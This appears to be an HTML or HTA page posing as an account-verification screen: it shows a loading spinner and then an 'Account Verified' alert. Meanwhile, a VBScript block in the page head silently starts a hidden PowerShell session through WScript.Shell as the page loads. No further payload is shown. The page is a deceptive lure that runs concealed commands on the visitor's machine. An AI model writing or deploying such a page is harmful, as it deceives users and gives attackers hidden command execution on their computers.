<html> 
<head> 
			<script language="VBScript"> 
                Set objShell = CreateObject("Wscript.Shell")
                objShell.Run "cmd.exe /c powershell", 0
            </script> 
</head> 
<body> 
<div id = "myDiv" style="display:none" align="center"><img id = "Loading" src = "images/loading_spinner.gif" ></div><br>
<script type="text/javascript">

  (function(){
    var myDiv = document.getElementById("myDiv");

    var show = function(){
      myDiv.style.display = "block";
      setTimeout(hide, 10000);  // 10 seconds
    }

    var hide = function(){
      myDiv.style.display = "none";
      window.alert("Account Verified");
    }

    show();
  })();

</script>


</body> 
</html>
